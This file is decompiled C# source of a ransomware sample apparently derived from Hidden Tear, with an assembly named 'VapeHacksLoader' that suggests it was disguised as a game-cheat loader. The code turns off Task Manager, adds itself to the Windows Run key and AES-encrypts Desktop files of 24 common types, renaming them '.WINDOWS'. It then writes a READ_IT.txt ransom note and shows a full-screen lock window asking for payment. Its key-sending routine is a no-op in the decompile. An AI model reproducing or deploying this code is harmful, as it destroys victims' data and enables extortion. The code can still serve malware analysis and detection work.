// Decompiled with JetBrains decompiler
// Type: hidden_tear.Form1
// Assembly: VapeHacksLoader, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 630DF1DB-C121-457B-BCEC-9948B868FD96
// Assembly location: C:\Users\user\volal\dumps\executable.3720.exe

using hidden_tear.Properties;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace hidden_tear
{
  public class Form1 : Form
  {
    private string userName = Environment.UserName;
    private string computerName = Environment.MachineName.ToString();
    private string userDir = "C:\\Users\\";
    private IContainer components = (IContainer) null;
    private Label label1;
    private Label label2;
    private Button button1;
    private PictureBox pictureBox1;

    public Form1()
    {
      this.InitializeComponent();
      RegistryKey subKey1 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
      if (subKey1.GetValue("DisableTaskMgr") == null)
        subKey1.SetValue("DisableTaskMgr", (object) "1");
      else
        subKey1.DeleteValue("DisableTaskMgr");
      RegistryKey subKey2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
      subKey2.SetValue("Wallpaper", (object) "0");
      subKey2.Close();
      subKey1.Close();
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Opacity = 100.0;
      this.ShowInTaskbar = false;
      this.startAction();
    }

    private void Form_Shown(object sender, EventArgs e)
    {
      this.Visible = false;
      this.Opacity = 100.0;
      Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("092", (object) Application.ExecutablePath.ToString());
    }

    public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
    {
      byte[] numArray = (byte[]) null;
      byte[] salt = new byte[8]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
      };
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        {
          rijndaelManaged.KeySize = 256;
          rijndaelManaged.BlockSize = 128;
          Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
          rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
          rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
          rijndaelManaged.Mode = CipherMode.CBC;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
            cryptoStream.Close();
          }
          numArray = memoryStream.ToArray();
        }
      }
      return numArray;
    }

    public string CreatePassword(int length)
    {
      StringBuilder stringBuilder = new StringBuilder();
      Random random = new Random();
      while (0 < length--)
        stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
      return stringBuilder.ToString();
    }

    public void SendPassword(string password) => this.computerName + "-" + this.userName + " " + password;

    public void EncryptFile(string file, string password)
    {
      byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
      byte[] bytes1 = Encoding.UTF8.GetBytes(password);
      byte[] hash = SHA256.Create().ComputeHash(bytes1);
      byte[] bytes2 = this.AES_Encrypt(bytesToBeEncrypted, hash);
      File.WriteAllBytes(file, bytes2);
      File.Move(file, file + ".WINDOWS");
    }

    public void encryptDirectory(string location, string password)
    {
      string[] strArray = new string[24]
      {
        ".txt",
        ".doc",
        ".docx",
        ".xls",
        ".xlsx",
        ".ppt",
        ".pptx",
        ".odt",
        ".jpg",
        ".png",
        ".csv",
        ".sql",
        ".mdb",
        ".sln",
        ".php",
        ".asp",
        ".aspx",
        ".html",
        ".xml",
        ".psd",
        ".URL",
        ".kys",
        ".bat",
        ".java"
      };
      string[] files = Directory.GetFiles(location);
      string[] directories = Directory.GetDirectories(location);
      for (int index = 0; index < files.Length; ++index)
      {
        string extension = Path.GetExtension(files[index]);
        if (((IEnumerable<string>) strArray).Contains<string>(extension))
          this.EncryptFile(files[index], password);
      }
      for (int index = 0; index < directories.Length; ++index)
        this.encryptDirectory(directories[index], password);
    }

    public void startAction()
    {
      string password = this.CreatePassword(15);
      string location = this.userDir + this.userName + "\\Desktop\\";
      this.SendPassword(password);
      this.encryptDirectory(location, password);
      this.messageCreator();
    }

    public void messageCreator() => File.WriteAllLines(this.userDir + this.userName + "\\Desktop\\READ_IT.txt", new string[3]
    {
      "Your files have been encrypted.",
      "Read the Program for more information",
      "read program for more information."
    });

    private void button1_Click(object sender, EventArgs e)
    {
      int num = (int) new Form2().ShowDialog();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.label1 = new Label();
      this.label2 = new Label();
      this.button1 = new Button();
      this.pictureBox1 = new PictureBox();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      this.SuspendLayout();
      this.label1.AutoSize = true;
      this.label1.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.label1.ForeColor = System.Drawing.Color.Red;
      this.label1.Location = new Point(7, 71);
      this.label1.Name = "label1";
      this.label1.Size = new Size(1010, 25);
      this.label1.TabIndex = 0;
      this.label1.Text = "Your computer is locked. Please do not close this window as that will result in serious computer damage.";
      this.label2.AutoSize = true;
      this.label2.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold);
      this.label2.ForeColor = System.Drawing.Color.Red;
      this.label2.Location = new Point(185, 139);
      this.label2.Name = "label2";
      this.label2.Size = new Size(720, 25);
      this.label2.TabIndex = 1;
      this.label2.Text = "Click next for more information and payment on how to get your files back.";
      this.button1.BackColor = System.Drawing.Color.Black;
      this.button1.ForeColor = System.Drawing.Color.Red;
      this.button1.Location = new Point(373, 461);
      this.button1.Name = "button1";
      this.button1.Size = new Size(278, 88);
      this.button1.TabIndex = 2;
      this.button1.Text = "Next";
      this.button1.UseVisualStyleBackColor = false;
      this.button1.Click += new EventHandler(this.button1_Click);
      this.pictureBox1.Image = (Image) Resources.Untitled;
      this.pictureBox1.Location = new Point(260, 206);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(504, 226);
      this.pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
      this.pictureBox1.TabIndex = 3;
      this.pictureBox1.TabStop = false;
      this.AutoScaleDimensions = new SizeF(8f, 16f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = System.Drawing.Color.Black;
      this.ClientSize = new Size(1025, 561);
      this.ControlBox = false;
      this.Controls.Add((Control) this.pictureBox1);
      this.Controls.Add((Control) this.button1);
      this.Controls.Add((Control) this.label2);
      this.Controls.Add((Control) this.label1);
      this.ForeColor = System.Drawing.Color.White;
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Margin = new Padding(4);
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Load += new EventHandler(this.Form1_Load);
      ((ISupportInitialize) this.pictureBox1).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
